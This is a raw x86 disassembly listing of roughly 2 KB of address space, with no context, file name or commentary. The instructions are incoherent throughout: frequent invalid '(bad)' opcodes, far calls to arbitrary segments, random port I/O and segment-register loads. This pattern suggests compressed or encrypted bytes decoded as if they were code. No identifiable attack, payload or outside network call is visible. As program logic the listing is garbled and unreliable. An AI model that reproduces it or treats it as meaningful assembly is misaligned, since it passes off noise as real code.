  418cf0:	es adc ebx,DWORD PTR es:[ebp-0x1b]
  418cf5:	in     eax,0x70
  418cf7:	xchg   ebp,eax
  418cf8:	std    
  418cf9:	ja     0x418d57
  418cfb:	mov    ebp,0xd8cae3e8
  418d00:	mov    WORD PTR [eax-0x6a5e3ecf],fs
  418d06:	ja     0x418d1e
  418d08:	xchg   ebp,eax
  418d09:	out    dx,al
  418d0a:	outs   dx,BYTE PTR ds:[esi]
  418d0b:	and    bl,dl
  418d0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d0e:	pop    ebp
  418d0f:	aam    0x56
  418d11:	fs pop ds
  418d13:	sbb    al,0xff
  418d15:	or     BYTE PTR [ebx],bh
  418d17:	ins    BYTE PTR es:[edi],dx
  418d18:	inc    ebx
  418d19:	mov    cl,0x20
  418d1b:	call   0x4999a675
  418d20:	xchg   bh,ah
  418d22:	dec    ebx
  418d23:	mov    eax,0x35d221a3
  418d28:	sti    
  418d29:	add    al,0x5c
  418d2b:	mov    al,0x4a
  418d2d:	aam    0xf6
  418d2f:	xchg   edx,esp
  418d31:	mov    bh,ah
  418d33:	jbe    0x418d45
  418d35:	cmp    al,0xf9
  418d37:	add    esi,DWORD PTR [edx+0x4]
  418d3a:	aas    
  418d3b:	jmp    0x6c038554
  418d40:	call   0x15a6:0x2e9395bf
  418d47:	push   ds
  418d48:	lahf   
  418d49:	pop    ebx
  418d4a:	test   BYTE PTR [esi],bl
  418d4c:	dec    ecx
  418d4d:	push   ebp
  418d4e:	(bad)  
  418d4f:	sub    eax,0xf52df53
  418d54:	cld    
  418d55:	dec    esp
  418d56:	and    al,0x38
  418d58:	imul   ebx,edi,0x613f142d
  418d5e:	and    BYTE PTR [esi],0xa4
  418d61:	mov    bh,0xa6
  418d63:	lock shl bh,cl
  418d66:	xor    eax,0x936f4191
  418d6b:	mov    BYTE PTR [esi+0x0],ch
  418d6e:	loopne 0x418d12
  418d70:	retf   0x5886
  418d73:	mov    esi,0x1d28d82c
  418d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d79:	mov    ch,0xbd
  418d7b:	sbb    esp,DWORD PTR ds:0xa25064c1
  418d81:	aam    0xd4
  418d83:	sbb    al,dl
  418d85:	and    eax,0x5d6ff4d9
  418d8a:	pusha  
  418d8b:	sub    DWORD PTR [edi+ebp*4-0x74],edx
  418d8f:	sahf   
  418d90:	and    ah,bl
  418d92:	stc    
  418d93:	stos   BYTE PTR es:[edi],al
  418d94:	in     al,0xcd
  418d96:	dec    ebp
  418d97:	dec    esi
  418d98:	pop    ebx
  418d99:	cmc    
  418d9a:	pop    ss
  418d9b:	pop    esp
  418d9c:	mov    ecx,esi
  418d9e:	lods   al,BYTE PTR ds:[esi]
  418d9f:	fisubr WORD PTR [eax+0x6]
  418da2:	push   edi
  418da3:	adc    eax,0xe5ac811
  418da8:	(bad)
  418dac:	adc    esi,DWORD PTR [edi]
  418dae:	in     al,0x14
  418db0:	jae    0x418d80
  418db2:	cmp    dl,BYTE PTR [esi+eax*2+0x64]
  418db6:	inc    ebx
  418db7:	fadd   st,st(4)
  418db9:	outs   dx,DWORD PTR ds:[esi]
  418dba:	push   ds
  418dbb:	xchg   esp,eax
  418dbc:	inc    ebp
  418dbd:	adc    eax,0x663cd385
  418dc2:	pop    esp
  418dc3:	xor    BYTE PTR [ecx+0x524f12a9],bl
  418dc9:	aas    
  418dca:	or     eax,0x256a5bb2
  418dcf:	lea    edi,[ecx+0x48c55fb8]
  418dd5:	mov    edx,0x1f4450e8
  418dda:	inc    ebx
  418ddb:	sub    al,0x6b
  418ddd:	cli    
  418dde:	and    esi,edx
  418de0:	pushf  
  418de1:	mov    eax,0x5b211f1c
  418de6:	rcr    BYTE PTR [ebx+0x7c],cl
  418de9:	xchg   esp,eax
  418dea:	add    al,0x6b
  418dec:	cld    
  418ded:	fdivr  DWORD PTR [ebx+0x33ca6602]
  418df3:	xor    DWORD PTR [edi+0x3c],ebx
  418df6:	push   eax
  418df7:	inc    ebx
  418df8:	sbb    al,0x72
  418dfa:	arpl   WORD PTR [edi-0xd556530],bx
  418e00:	arpl   WORD PTR [eax+0x62],bx
  418e03:	popf   
  418e04:	pop    eax
  418e05:	in     al,0x6
  418e07:	adc    BYTE PTR [eax-0x1],al
  418e0a:	loopne 0x418ddc
  418e0c:	fwait
  418e0d:	cmp    al,0x4d
  418e0f:	pop    edx
  418e10:	(bad)  
  418e11:	push   ss
  418e12:	push   es
  418e13:	aam    0x6c
  418e15:	sbb    esi,DWORD PTR [ecx-0x4c]
  418e18:	adc    BYTE PTR [eax-0x1a],cl
  418e1b:	sub    BYTE PTR [esi+0x4bb002cd],ch
  418e21:	test   eax,0xa5097cde
  418e26:	and    DWORD PTR [edi-0x6c66c3df],esi
  418e2c:	sub    dh,BYTE PTR [esi+0x1742e171]
  418e32:	xchg   ebx,eax
  418e33:	rcl    DWORD PTR gs:[ecx+0x3e226296],1
  418e3a:	aas    
  418e3b:	das    
  418e3c:	jne    0x418e05
  418e3e:	sub    ecx,esi
  418e40:	jb     0x418ea9
  418e42:	mov    BYTE PTR [edi-0x70e307d2],bl
  418e48:	lahf   
  418e49:	push   DWORD PTR [edx]
  418e4b:	aaa    
  418e4c:	sbb    ecx,esp
  418e4e:	push   ds
  418e4f:	mov    ah,0xbf
  418e51:	and    DWORD PTR [ebp+0x66],edx
  418e54:	xor    cl,bh
  418e56:	push   eax
  418e57:	or     DWORD PTR [ecx+eax*2-0xe854ee8],0xbde2fccd
  418e62:	mov    ds,WORD PTR [ebx+esi*8-0x7f]
  418e66:	mov    ah,0x20
  418e68:	dec    edx
  418e69:	pop    eax
  418e6a:	cmc    
  418e6b:	jns    0x418e3b
  418e6d:	push   0x26
  418e6f:	xor    BYTE PTR gs:[edi],bl
  418e72:	dec    edx
  418e73:	ja     0x418eaf
  418e75:	stos   DWORD PTR es:[edi],eax
  418e76:	lds    esp,FWORD PTR [esi-0x1d4f57b1]
  418e7c:	mov    ebx,0x870d6598
  418e81:	pop    esi
  418e82:	aas    
  418e83:	mov    eax,0xc5762ec3
  418e88:	retf   0x89c2
  418e8b:	leave  
  418e8c:	inc    edi
  418e8d:	mov    al,BYTE PTR [eax+edx*1+0x16]
  418e91:	push   edi
  418e92:	sbb    BYTE PTR [ecx],dl
  418e94:	jbe    0x418e37
  418e96:	jle    0x418e3c
  418e98:	lea    edi,[ecx+0x4f058836]
  418e9e:	cmp    BYTE PTR [esi*1+0x5ec5f7d8],bh
  418ea5:	jns    0x418e56
  418ea7:	ficomp WORD PTR [eax-0x1454b605]
  418ead:	fadd   st(1),st
  418eaf:	pop    eax
  418eb0:	pop    ds
  418eb1:	cmp    eax,0xf8d55f36
  418eb6:	pop    es
  418eb7:	test   DWORD PTR [esp+eiz*8-0x79c15fbf],ecx
  418ebe:	(bad)  
  418ebf:	pop    esp
  418ec0:	call   0x6b3a0a9d
  418ec5:	call   0xa2d653d2
  418eca:	push   ds
  418ecb:	cmp    al,0xe5
  418ecd:	mov    ch,0xb3
  418ecf:	out    dx,al
  418ed0:	repnz mov edi,0xce2fca60
  418ed6:	shl    DWORD PTR [edi+0x4481f3c8],cl
  418edc:	xchg   DWORD PTR [edi],edx
  418ede:	xchg   ebx,eax
  418edf:	sub    esp,ebp
  418ee1:	jg     0x418f24
  418ee3:	rcl    DWORD PTR [esi+0x5534b4e5],cl
  418ee9:	lahf   
  418eea:	jne    0x418eb1
  418eec:	or     dh,BYTE PTR [ebx+esi*4-0x27962fd6]
  418ef3:	aam    0xf1
  418ef5:	leave  
  418ef6:	sbb    edi,DWORD PTR [ebx+0x2a]
  418ef9:	(bad)  
  418efa:	int    0x45
  418efc:	cmp    esi,DWORD PTR [esi+0x3403753e]
  418f02:	inc    ebx
  418f03:	pop    ss
  418f04:	mov    ecx,0x217d43e
  418f09:	in     eax,0x3e
  418f0b:	mov    esi,0x92f8c500
  418f10:	lds    eax,FWORD PTR [edi+0x5f]
  418f13:	sbb    al,0x5c
  418f15:	iret   
  418f16:	add    DWORD PTR [eax*2+0x42d53cf],edx
  418f1d:	(bad)  
  418f1e:	mov    ds:0x358aedcb,al
  418f23:	jo     0x418ed0
  418f25:	cli    
  418f26:	push   cs
  418f27:	add    eax,0xd9fa5205
  418f2c:	inc    edx
  418f2d:	ret    
  418f2e:	xchg   ebp,eax
  418f2f:	xchg   ecx,eax
  418f30:	push   cs
  418f31:	repnz or ebp,DWORD PTR [edi-0x5c]
  418f35:	and    ebx,DWORD PTR [ebp-0x3d]
  418f38:	cli    
  418f39:	das    
  418f3a:	je     0x418f79
  418f3c:	jmp    0x9ba8:0x11525d29
  418f43:	test   eax,0xc6d44b94
  418f48:	shl    DWORD PTR [esi+0x682884e3],0xd2
  418f4f:	cmp    DWORD PTR [esi-0x29],eax
  418f52:	inc    eax
  418f53:	mov    ds:0x23efa78d,al
  418f58:	inc    esp
  418f59:	xor    cl,BYTE PTR [edi-0x66]
  418f5c:	dec    ebx
  418f5d:	fdiv   QWORD PTR [esi+0x2a]
  418f60:	mov    WORD PTR [ecx-0x5c],?
  418f63:	inc    ecx
  418f64:	jge    0x418fc0
  418f66:	jle    0x418fc1
  418f68:	or     ebp,DWORD PTR [esi]
  418f6a:	mov    ebp,0x2e7b1a17
  418f6f:	mov    ds:0xd7543a71,eax
  418f74:	xor    ecx,DWORD PTR [ebp+0x4ba273c4]
  418f7a:	into   
  418f7b:	scas   eax,DWORD PTR es:[edi]
  418f7c:	pop    esp
  418f7d:	(bad)  
  418f7f:	dec    ebx
  418f80:	aad    0x65
  418f82:	mov    al,0xcd
  418f84:	add    DWORD PTR [ebx],edi
  418f86:	outs   dx,DWORD PTR ds:[esi]
  418f87:	mov    bh,0x41
  418f89:	jp     0x418fb6
  418f8b:	mov    ebx,0xe42cd2af
  418f90:	arpl   WORD PTR [ebx],sp
  418f92:	dec    DWORD PTR [esi]
  418f94:	les    edi,FWORD PTR [edx+0x22b4baf8]
  418f9a:	or     esp,ecx
  418f9c:	fucomip st,st(5)
  418f9e:	fadd   st,st(5)
  418fa0:	or     ebx,DWORD PTR [esi]
  418fa2:	cld    
  418fa3:	cmp    cl,bh
  418fa5:	push   eax
  418fa6:	mov    edx,edi
  418fa8:	jecxz  0x418f43
  418faa:	cwde   
  418fab:	cmp    esi,DWORD PTR [edx+0x5f7bcaf7]
  418fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fb2:	jmp    0x418f56
  418fb4:	push   ecx
  418fb5:	iret   
  418fb6:	mov    ebp,DWORD PTR [edx-0xd456895]
  418fbc:	push   ebx
  418fbd:	idiv   BYTE PTR [edi-0x7c]
  418fc0:	mov    ds:0xa99b66c,al
  418fc5:	pop    ebp
  418fc6:	lock call 0x9a426787
  418fcc:	shl    BYTE PTR [ebp-0x67],cl
  418fcf:	imul   esi,DWORD PTR [eax+ebx*2+0x33],0xffffffa4
  418fd4:	retf   
  418fd5:	add    ecx,DWORD PTR [edi+0x4e968c04]
  418fdb:	adc    bh,bh
  418fdd:	stos   BYTE PTR es:[edi],al
  418fde:	lods   al,BYTE PTR ds:[esi]
  418fdf:	cld    
  418fe0:	jmp    0xab29162a
  418fe5:	shr    DWORD PTR [edi+edx*4+0x46],0xfa
  418fea:	pop    edi
  418feb:	out    0x89,al
  418fed:	xchg   bh,ah
  418fef:	inc    edi
  418ff0:	or     BYTE PTR [esi+eiz*1],bh
  418ff3:	(bad)  
  418ff4:	cwde   
  418ff5:	fadd   DWORD PTR [edi+edi*1+0x816e338]
  418ffc:	inc    ebx
  418ffd:	stos   BYTE PTR es:[edi],al
  418ffe:	mov    al,ds:0x3832cb38
  419003:	ds fsubr st(1),st
  419006:	dec    ebx
  419007:	and    ch,BYTE PTR [edx-0x2c]
  41900a:	imul   ebp,DWORD PTR [edx],0x58
  41900d:	sahf   
  41900e:	pop    eax
  41900f:	lods   eax,DWORD PTR ds:[esi]
  419010:	xchg   ebp,eax
  419011:	stos   BYTE PTR es:[edi],al
  419012:	test   BYTE PTR [eax],bh
  419014:	xor    ah,BYTE PTR [ebp-0x3af8d656]
  41901a:	mov    ebx,0xadb3c243
  41901f:	sbb    ah,bh
  419021:	push   ss
  419022:	push   esp
  419023:	mov    edi,0xebfd01c7
  419028:	and    DWORD PTR [esi],esp
  41902a:	push   edx
  41902b:	or     al,0xa4
  41902d:	ror    bh,cl
  41902f:	jge    0x41900f
  419031:	push   0x1ef6334b
  419036:	or     al,0xca
  419038:	xchg   ecx,eax
  419039:	sbb    al,0xe7
  41903b:	daa    
  41903c:	xchg   ebp,eax
  41903d:	mov    eax,ds:0xfc264cb6
  419042:	mov    ch,0xb
  419044:	mov    ah,0x66
  419046:	iret   
  419047:	dec    eax
  419048:	jl     0x419030
  41904a:	push   esi
  41904b:	inc    ecx
  41904c:	ret    
  41904d:	clc    
  41904e:	xor    dh,BYTE PTR [edi+0xa]
  419051:	jnp    0x419092
  419053:	jb     0x419043
  419055:	mov    ah,0x5a
  419057:	test   eax,0xe272a37
  41905c:	and    eax,DWORD PTR [ebp+0x3e]
  41905f:	or     al,0xca
  419061:	mov    ch,0xbd
  419063:	or     esp,edx
  419065:	push   cx
  419067:	lds    ebx,FWORD PTR [edx-0x2a]
  41906a:	pop    edi
  41906b:	mov    WORD PTR [eax-0x5f],fs
  41906e:	rol    DWORD PTR [esi],cl
  419070:	ret    
  419071:	jae    0x419062
  419073:	dec    ecx
  419074:	push   edx
  419075:	push   ss
  419076:	(bad)  
  419077:	jecxz  0x419024
  419079:	pusha  
  41907a:	push   es
  41907b:	jl     0x419029
  41907d:	(bad)  
  41907e:	adc    ah,bh
  419080:	les    esp,FWORD PTR [ebp+0x64ef66a0]
  419086:	ds cwde 
  419088:	clc    
  419089:	cmc    
  41908a:	mov    eax,esi
  41908c:	hlt    
  41908d:	adc    edx,DWORD PTR [ecx+0x13e044b1]
  419093:	pop    edx
  419094:	mov    bl,0x89
  419096:	lods   eax,DWORD PTR ds:[esi]
  419097:	std    
  419098:	push   0xa8473af3
  41909d:	mov    bl,0x45
  41909f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a0:	push   0x9e0f908d
  4190a5:	popa   
  4190a6:	outs   dx,DWORD PTR ds:[esi]
  4190a7:	sbb    eax,0x14e7fb62
  4190ac:	inc    ebp
  4190ad:	aam    0x85
  4190af:	mov    BYTE PTR [ebp-0x6b],ah
  4190b2:	stc    
  4190b3:	sub    ah,bl
  4190b5:	xor    eax,0x11aae6fd
  4190ba:	and    ah,al
  4190bc:	retf   0xf25d
  4190bf:	mov    ds:0x15b94a29,al
  4190c4:	test   eax,0x22e8ad20
  4190c9:	sbb    eax,DWORD PTR [eax+0x66ac7719]
  4190cf:	jge    0x419068
  4190d1:	jb     0x41907a
  4190d3:	out    0xe6,al
  4190d5:	ret    
  4190d6:	mov    ecx,cs
  4190d8:	inc    ecx
  4190d9:	mov    bh,0x31
  4190db:	add    DWORD PTR ds:0x9e07671b,esi
  4190e1:	jno    0x419109
  4190e3:	or     bl,BYTE PTR [eax]
  4190e5:	jl     0x41906e
  4190e7:	shr    DWORD PTR [edx],0x7d
  4190ea:	test   al,0x4d
  4190ec:	shr    DWORD PTR [ebx+0x57c458fe],0x2c
  4190f3:	inc    esp
  4190f4:	mov    al,ds:0x22466c0b
  4190f9:	pop    ebx
  4190fa:	xor    ebp,ebx
  4190fc:	(bad)  
  4190fd:	cs push fs
  419100:	add    DWORD PTR [ebp+0xa],0xffffff85
  419104:	and    bh,dl
  419106:	adc    al,0xeb
  419108:	cdq    
  419109:	out    0x38,eax
  41910b:	mov    cl,0xd7
  41910d:	stc    
  41910e:	add    al,0x4
  419110:	adc    DWORD PTR [edi],edi
  419112:	call   0x96f73653
  419117:	test   al,ch
  419119:	mov    ah,0x59
  41911b:	pushf  
  41911c:	or     cl,BYTE PTR [ebx]
  41911e:	pop    edi
  41911f:	add    eax,0xb2c40e5d
  419124:	inc    edi
  419125:	mov    edi,0x141a239
  41912a:	inc    eax
  41912b:	jnp    0x41911e
  41912d:	jle    0x41912b
  41912f:	xor    al,0x72
  419131:	sbb    bh,BYTE PTR [esi+ebx*8]
  419134:	mov    dl,BYTE PTR [eax+0x5838c591]
  41913a:	mov    es,WORD PTR [edi+esi*1+0x7f207d68]
  419141:	js     0x4190cd
  419143:	rcl    BYTE PTR [edx],1
  419145:	fldcw  WORD PTR [esi]
  419147:	stc    
  419148:	jo     0x419189
  41914a:	ja     0x419145
  41914c:	jno    0x419191
  41914e:	jbe    0x4190f7
  419150:	popf   
  419151:	mov    al,ds:0x46489b91
  419156:	daa    
  419157:	push   edx
  419158:	retf   
  419159:	addr16 mov dl,0xd0
  41915c:	push   eax
  41915d:	mov    bl,0xb
  41915f:	or     bh,al
  419161:	test   eax,0x8e63b508
  419166:	pop    ecx
  419167:	xchg   edi,eax
  419168:	enter  0x8a3b,0xf7
  41916c:	pop    ss
  41916d:	rcr    BYTE PTR [ebx-0x50],1
  419170:	stc    
  419171:	shl    BYTE PTR [edi+0x19556eb9],0xa9
  419178:	dec    edx
  419179:	daa    
  41917a:	call   0x534:0xd6f30562
  419181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419182:	fstp   DWORD PTR [edi+0xb2b5926]
  419188:	fnstenv [edi]
  41918a:	test   al,0xb0
  41918c:	or     eax,0xe7d12be0
  419191:	in     eax,0xe
  419193:	out    0x12,al
  419195:	mov    cl,0x3f
  419197:	mov    ch,BYTE PTR [ebx]
  419199:	xor    bh,BYTE PTR [edi-0x28d7f8b9]
  41919f:	xor    BYTE PTR [ecx],0xf7
  4191a2:	adc    BYTE PTR [esp+ebx*2],0x4
  4191a6:	sub    DWORD PTR [eax],esi
  4191a8:	cmc    
  4191a9:	ins    BYTE PTR es:[edi],dx
  4191aa:	(bad)  
  4191ab:	inc    BYTE PTR [ebx]
  4191ad:	call   0x5426437e
  4191b2:	cmp    al,dl
  4191b4:	push   edx
  4191b5:	ins    BYTE PTR es:[edi],dx
  4191b6:	sahf   
  4191b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191b8:	xor    eax,DWORD PTR [eax-0x52]
  4191bb:	sub    DWORD PTR [ebx+0x29],esp
  4191be:	pop    es
  4191bf:	je     0x419181
  4191c1:	dec    ebp
  4191c2:	fsubr  DWORD PTR [esi+eiz*1]
  4191c5:	cld    
  4191c6:	jle    0x4191c9
  4191c8:	sub    al,0xbb
  4191ca:	rcr    DWORD PTR [esp+ebx*1-0x72],0xf4
  4191cf:	adc    eax,0x7c2b7de
  4191d4:	xchg   esi,eax
  4191d5:	and    al,0x8e
  4191d7:	cli    
  4191d8:	fld    QWORD PTR [edx+0x33f8844e]
  4191de:	je     0x419223
  4191e0:	pop    esi
  4191e1:	ret    
  4191e2:	call   0xe9ea:0xc51a4f54
  4191e9:	leave  
  4191ea:	nop
  4191eb:	sbb    al,BYTE PTR [edi+esi*4]
  4191ee:	fstp   TBYTE PTR [ebx]
  4191f0:	test   al,0x53
  4191f2:	loopne 0x419188
  4191f4:	popa   
  4191f5:	hlt    
  4191f6:	cmp    eax,0xafe26403
  4191fb:	mov    WORD PTR [ebp+0x6278fb4f],gs
  419201:	inc    ecx
  419202:	pusha  
  419203:	outs   dx,DWORD PTR ds:[esi]
  419204:	cdq    
  419205:	adc    cl,BYTE PTR [edi]
  419207:	mov    al,0x22
  419209:	mov    dl,BYTE PTR [edi-0x3d8f4e63]
  41920f:	ror    DWORD PTR ds:0x776cc70c,1
  419215:	jle    0x4191e3
  419217:	scas   al,BYTE PTR es:[edi]
  419218:	dec    edx
  419219:	dec    esp
  41921a:	pop    ebp
  41921b:	cmp    al,BYTE PTR fs:[ebx+0x7b]
  41921f:	rcl    BYTE PTR [ebp-0x55de20c2],0x9e
  419226:	stc    
  419227:	fcomp  DWORD PTR ds:0xe74aeefe
  41922d:	xchg   ebx,eax
  41922e:	sub    bl,BYTE PTR [edx]
  419230:	jp     0x419254
  419232:	mov    eax,ds:0x30b9b497
  419237:	mov    cl,0x92
  419239:	bound  ebp,QWORD PTR [eax-0x7d]
  41923c:	fimul  WORD PTR [edi-0x71]
  41923f:	dec    ebp
  419240:	int    0xcc
  419242:	in     al,dx
  419243:	xor    BYTE PTR [edi+0x39],bl
  419246:	loop   0x419229
  419248:	jmp    0x419239
  41924a:	pop    esp
  41924b:	xor    al,0x7c
  41924d:	frstor [edi+0x37555109]
  419253:	call   0x6fe0:0x8b8fa599
  41925a:	ror    DWORD PTR [edi-0x34],0x52
  41925e:	repz out 0xc3,eax
  419261:	nop
  419262:	fbld   TBYTE PTR ds:0x66ff4f16
  419268:	lds    ebx,FWORD PTR [esi+0x6a]
  41926b:	and    DWORD PTR [eax+0x3d089635],esi
  419271:	inc    ebx
  419272:	inc    eax
  419273:	cmp    eax,0x24beeea6
  419278:	std    
  419279:	popa   
  41927a:	sti    
  41927b:	rcr    DWORD PTR [eax-0xb],0xd6
  41927f:	lds    edi,FWORD PTR [esi]
  419281:	(bad)  
  419282:	lods   al,BYTE PTR ds:[esi]
  419283:	push   ebp
  419284:	div    al
  419286:	lock pushf 
  419288:	test   al,0x98
  41928a:	call   0x595053da
  41928f:	or     eax,0xf229c030
  419294:	push   es
  419295:	push   ebx
  419296:	dec    ecx
  419297:	jg     0x41924c
  419299:	mov    ebx,0xdf49811d
  41929e:	inc    edi
  41929f:	lahf   
  4192a0:	inc    esp
  4192a1:	and    al,ah
  4192a3:	js     0x419319
  4192a5:	loope  0x419267
  4192a7:	mov    eax,ds:0xf8aaabb0
  4192ac:	mov    cs,WORD PTR [ebp+eax*1-0x39feb410]
  4192b3:	pusha  
  4192b4:	lds    esi,FWORD PTR [esi+edi*1+0x4fc5b881]
  4192bb:	adc    BYTE PTR [esi-0x6f],0x90
  4192bf:	adc    eax,0x6f11c70b
  4192c4:	inc    esp
  4192c5:	or     ch,BYTE PTR [edi+eax*1-0x48c1021b]
  4192cc:	jo     0x41929b
  4192ce:	es aam 0x16
  4192d1:	dec    edi
  4192d2:	call   0x5c31:0x7bc5260a
  4192d9:	mov    ?,WORD PTR [esi+0x1]
  4192dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192dd:	leave  
  4192de:	fidivr WORD PTR [edi]
  4192e0:	stos   DWORD PTR es:[edi],eax
  4192e1:	jbe    0x4192d3
  4192e3:	les    esp,FWORD PTR [ecx]
  4192e5:	sub    esp,DWORD PTR [ebx]
  4192e7:	xchg   edi,eax
  4192e8:	(bad)  
  4192e9:	xor    ebx,DWORD PTR [edi+0x23803350]
  4192ef:	(bad)  
  4192f1:	sbb    esp,DWORD PTR [eax-0x3b]
  4192f4:	pop    ds
  4192f5:	call   0x47553b6e
  4192fa:	retf   0xd602
  4192fd:	stos   DWORD PTR es:[edi],eax
  4192fe:	ja     0x4192a5
  419300:	test   BYTE PTR [ebp+0x189ebdd7],al
  419306:	inc    ebp
  419307:	cld    
  419308:	jmp    0x45b580f0
  41930d:	xor    eax,0x58b3e68f
  419312:	pusha  
  419313:	loope  0x4192a2
  419315:	sbb    esi,DWORD PTR [edi]
  419317:	push   ecx
  419318:	call   0xf26f:0x79ec496c
  41931f:	push   edi
  419320:	sbb    BYTE PTR [esi],0x33
  419323:	inc    ebx
  419324:	imul   ebp,esi,0x87dec2ee
  41932a:	cdq    
  41932b:	enter  0x7f24,0x80
  41932f:	mov    WORD PTR [ebx+eax*4-0x14],fs
  419333:	jecxz  0x4192d6
  419335:	mov    ?,WORD PTR [esi+0x37]
  419338:	cmp    al,0x4b
  41933a:	xchg   ebx,eax
  41933b:	adc    dh,al
  41933d:	mov    bh,0x40
  41933f:	loop   0x419352
  419341:	jecxz  0x419323
  419343:	call   0xba6f:0xb75d5e83
  41934a:	push   ebx
  41934b:	add    BYTE PTR [edx+0x12a97a42],dh
  419351:	jns    0x41938e
  419353:	outs   dx,DWORD PTR ds:[esi]
  419354:	loope  0x41935b
  419356:	sbb    al,0xf9
  419358:	cwde   
  419359:	pop    edx
  41935a:	clc    
  41935b:	mov    ebp,0x4c6eea3c
  419360:	mov    ss,WORD PTR [ebp+esi*8-0x48]
  419364:	jmp    0x5e50aae2
  419369:	cmp    eax,0x5c033d09
  41936e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41936f:	dec    eax
  419370:	les    esi,FWORD PTR [edx+0x64]
  419373:	imul   eax,eax,0x54
  419376:	out    0x50,eax
  419378:	adc    DWORD PTR [esi],ecx
  41937a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41937b:	loope  0x41935a
  41937d:	fucomi st,st(3)
  41937f:	mov    edi,0x11c14251
  419384:	mov    ds:0x1bcd341a,eax
  419389:	mov    dh,0xf1
  41938b:	mov    ebp,0x4d1fe5c
  419390:	aas    
  419391:	cli    
  419392:	sub    esp,0x437ccb1c
  419398:	pop    es
  419399:	and    eax,0x7772c979
  41939e:	push   ebp
  41939f:	out    0xb1,eax
  4193a1:	neg    BYTE PTR [ebp+0x702bdef4]
  4193a7:	retf   
  4193a8:	cmp    BYTE PTR [eax],bl
  4193aa:	mov    al,0x60
  4193ac:	push   0x90cb3556
  4193b1:	repnz xor DWORD PTR [esi+0x7981754],esi
  4193b8:	scas   al,BYTE PTR es:[edi]
  4193b9:	clc    
  4193ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193bb:	leave  
  4193bc:	mov    al,ds:0x46d96e58
  4193c1:	pusha  
  4193c2:	sub    BYTE PTR [ebx+0x6d],ch
  4193c5:	lahf   
  4193c6:	mov    ch,0xc8
  4193c8:	pop    eax
  4193c9:	leave  
  4193ca:	xchg   ebx,eax
  4193cb:	cmp    ch,0xfd
  4193ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193cf:	mov    bh,0x37
  4193d1:	iret   
  4193d2:	std    
  4193d3:	retf   0x6b16
  4193d6:	scas   al,BYTE PTR es:[edi]
  4193d7:	sub    DWORD PTR [ebp+edx*1-0x15],esp
  4193db:	cmp    bl,bl
  4193dd:	pop    edi
  4193de:	cmp    DWORD PTR [ebx-0x3498347b],esi
  4193e4:	(bad)  [ebp-0x28a06461]
  4193ea:	mov    ds:0xf1b5ee4,eax
  4193ef:	jmp    0x4193df
  4193f1:	sbb    al,0x52
  4193f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193f4:	retf   
  4193f5:	jecxz  0x419422
  4193f7:	mov    ebx,0x992d10c3
  4193fc:	sub    al,0x25
  4193fe:	pusha  
  4193ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419400:	adc    al,0xb9
  419402:	and    DWORD PTR [edi-0x114e1788],0x2d6b21d1
  41940c:	jge    0x4193bf
  41940e:	loope  0x4193bf
  419410:	push   edi
  419411:	ins    BYTE PTR es:[edi],dx
  419412:	(bad)  
  419413:	pop    esp
  419414:	test   DWORD PTR [ebp+ebx*2-0x34fbcc9e],edx
  41941b:	push   eax
  41941c:	jmp    0x375e6ccf
  419421:	aam    0x88
  419423:	dec    esp
  419424:	pop    edi
  419425:	add    al,0xa5
  419427:	call   0x5f2ffa71
  41942c:	push   ebx
  41942d:	jmp    0x29ac:0xc74573e
  419434:	ja     0x419431
  419436:	push   ecx
  419437:	xor    DWORD PTR [edi+0x7026f85a],0x6aedd1e4
  419441:	in     al,0x7c
  419443:	mov    bl,0x61
  419445:	test   eax,0x477f71a3
  41944a:	mov    al,ds:0xa80040cc
  41944f:	inc    ebp
  419450:	mov    ecx,DWORD PTR [ebp+edi*1+0x10]
  419454:	mov    al,BYTE PTR [esi]
  419456:	push   DWORD PTR [ebp+0x1256b552]
  41945c:	test   eax,0xd8a9752f
  419461:	int3   
  419462:	jbe    0x419412
  419464:	push   ebp
  419465:	clc    
  419466:	fdivr  DWORD PTR [edi+0xa]
  419469:	push   cs
  41946a:	xchg   DWORD PTR [ecx+0xd213b4],edi
  419470:	adc    al,0xe4
  419472:	shr    ch,cl
  419474:	ss jecxz 0x4194c9
  419477:	int    0xbc
  419479:	and    esi,ebp
  41947b:	pop    edx
  41947c:	fld    DWORD PTR [esi-0x5c]
  41947f:	push   ebx
  419480:	test   eax,0x58fa4f3b
  419485:	xlat   BYTE PTR ds:[ebx]
  419486:	push   ds
  419487:	test   edi,esi
  419489:	pop    ebx
  41948a:	rcl    DWORD PTR [ebx],cl
  41948c:	repz push es
  41948e:	xchg   esp,eax
  41948f:	cmp    eax,0xf9f8fd20
  419494:	mov    cl,0x70
  419496:	add    BYTE PTR [ebx+0x567a0251],bl
  41949c:	xor    BYTE PTR [ecx+edx*1+0x17],bl
  4194a0:	das    
  4194a1:	mov    ebp,0xa1b82294
  4194a6:	add    BYTE PTR [edx],ah
  4194a8:	sbb    BYTE PTR [ecx-0x28c68c34],dh
  4194ae:	pop    ss
  4194af:	in     eax,0xcf
  4194b1:	data16 xor al,0xc6
  4194b4:	mov    WORD PTR [ebx],fs
  4194b6:	xchg   ecx,eax
  4194b7:	lock cmp bh,ah
  4194ba:	(bad)  
  4194bb:	pushf  
  4194bc:	sub    cl,BYTE PTR [ebx-0x301a69b5]
  4194c2:	(bad)  
  4194c4:	sbb    al,dh
  4194c6:	jnp    0x4194d1
  4194c8:	pop    ss
  4194c9:	jge    0x419509
  4194cb:	jmp    0x50c5490
  4194d0:	ret    
  4194d1:	ds daa 
  4194d3:	jle    0x41953a
  4194d5:	sub    al,0x2d
  4194d7:	sbb    al,0xf7
  4194d9:	pop    esi
  4194da:	push   ss
  4194db:	call   0x3e6e942d
  4194e0:	mov    eax,ds:0xcce82557
  4194e5:	popa   
  4194e6:	pop    esi
  4194e7:	in     eax,0x38
